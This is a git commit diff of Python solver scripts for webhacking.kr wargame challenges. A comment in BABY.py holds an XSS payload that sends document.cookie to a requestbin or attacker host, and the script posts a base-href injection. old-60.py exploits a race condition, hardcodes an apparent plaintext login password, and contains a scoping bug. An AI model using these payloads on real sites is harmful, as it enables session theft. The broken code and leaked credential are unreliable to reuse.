1433614f43bedd746784309f01d36c53f7d2753b
hackintoanetwork <83481196+hackintoanetwork@users.noreply.github.com>
2022-12-16 11:23:56 +0900

    Add files via upload

--- BABY.py
+++ BABY.py
@@ -4,7 +4,7 @@ url = "http://webhacking.kr:10010/report.php"
 cookie = {"PHPSESSID":"i3a6m2e00o7kgeo8vrfpg58j0s"}
 
 def solve():
-    # script.js -> document.location="http://[requestbin 주소]/?cookie="+document.cookie; -> 저장
+    # script.js -> document.location="[requestbin 주소]/?cookie="+document.cookie; -> 저장
     payload={"url":"?inject=<base href='http://[Attacker Server]'>"}
     res = requests.post(url, data=payload, cookies=cookie)
     if "reported! thank you!" in res.text:
---
+++ old-60.py
@@ -0,0 +1,41 @@
+import time
+import random
+import requests
+from multiprocessing import Pool
+
+url = "https://webhacking.kr/"
+
+def login(sess):
+    random.seed(time.time())
+    rand = str(random.randint(1,10000000))
+    sess.get(url)
+    sess.cookies.clear()
+    sess.cookies.update({'PHPSESSID':rand})
+    datas = {"id":"hackintoanetwork","pw":"hyos0427@@"}
+    res = sess.post(url=url+"login.php?login", data=datas)
+    if "<script>location.href='/';</script>" in res.text:
+        print("login success")
+        
+    else:
+        print("login Fail")
+
+def solve(param):
+    sess = requests.session()
+    login(sess)
+    url = url + "challenge/web-37/?"
+    payload = "mode={}".format(param)
+    res = sess.get(url = url+payload)
+    if "already solve" in res.text:
+        print("already solve")
+    elif "old-60 Pwned!" in res.text:
+        print("old-60 Pwned!")
+
+if __name__ == "__main__":
+    p = Pool(4)
+    ret1 = p.apply_async(solve,('',))
+    time.sleep(0.3)
+    ret2 = p.apply_async(solve,('auth',))
+    p.close()
+    p.join()
+
+
